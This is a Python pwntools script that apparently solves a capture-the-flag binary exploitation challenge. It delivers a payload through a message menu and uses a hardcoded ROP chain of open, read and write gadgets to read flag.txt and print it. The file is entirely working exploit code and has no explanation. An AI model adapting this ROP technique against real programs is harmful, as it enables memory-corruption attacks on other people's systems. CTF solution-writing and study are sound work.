from pwn import *

p = process('./challenge')

def build_payload(flag_path=b"flag.txt"):
    buffer_addr = 0x2F9E38
    color_idx = 0xD1C

    pop_rdi = 0x2D302D
    pop_rsi = 0x243431
    pop_rax5 = 0x28A2D6
    pop_rdx = 0x2E5A33
    
    open_c = 0x283A10
    file_read = 0x2A4E90
    stdout_write = 0x2A2630

    result_slot = 0x2FA0C2
    file_slot = result_slot + 4
    file_buf = 0x2FA2C2
    scratch = 0x2FA4C2
    opts_slot = 0x2FA6C2
    path_slot = 0x2FA7C2
    read_len = 0x20

    stage1 = bytearray(0x9A0)
    stage1[0:24] = p64(0) + p64(1) + p64(0)

    chain = p64(pop_rdi) + p64(result_slot)
    chain += p64(pop_rsi) + p64(path_slot)
    chain += p64(pop_rax5)
    chain += p64(scratch) + p64(0) + p64(0) + p64(0) + p64(0)
    chain += p64(pop_rdx)
    chain += p64(opts_slot)
    chain += p64(0) + p64(0) + p64(0)
    chain += p64(open_c)

    chain += p64(pop_rdi) + p64(file_slot)
    chain += p64(pop_rsi) + p64(file_buf)
    chain += p64(pop_rax5)
    chain += p64(scratch) + p64(0) + p64(0) + p64(0) + p64(0)
    chain += p64(pop_rdx)
    chain += p64(read_len)
    chain += p64(0) + p64(0) + p64(0xC200000000000000)
    chain += p64(file_read)

    chain += p64(pop_rsi) + p64(file_buf)
    chain += p64(pop_rax5)
    chain += p64(scratch) + p64(0) + p64(0) + p64(0) + p64(0)
    chain += p64(pop_rdx)
    chain += p64(read_len)
    chain += p64(0) + p64(0) + p64(0)
    chain += p64(stdout_write)
    chain += p64(0)

    chain_off = 0x60
    stage1[chain_off:chain_off + len(chain)] = chain

    opts_off = opts_slot - buffer_addr
    path_off = path_slot - buffer_addr

    stage1[opts_off:opts_off + 16] = p32(0) + p32(0) + b"\x01\x00\x00\x00\x00\x00\x00\x00"

    path_bytes = flag_path + b'\x00'
    stage1[path_off:path_off + len(path_bytes)] = path_bytes

    return bytes(stage1), color_idx

payload, tar_idx = build_payload()
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"New Message? ", payload)

p.sendlineafter(b"> ", b"2")
p.sendline(str(tar_idx).encode())

p.sendlineafter(b"> ", b"3")

try:
    result = p.recvall(timeout=2).decode('utf-8', errors='ignore')
    for line in result.split('\n'):
        if 'dice{' in line:
            print(f"[+] Flag Found: {line}")
            exit(0)
    print(result)
except EOFError:
    print("[-] Process terminated.")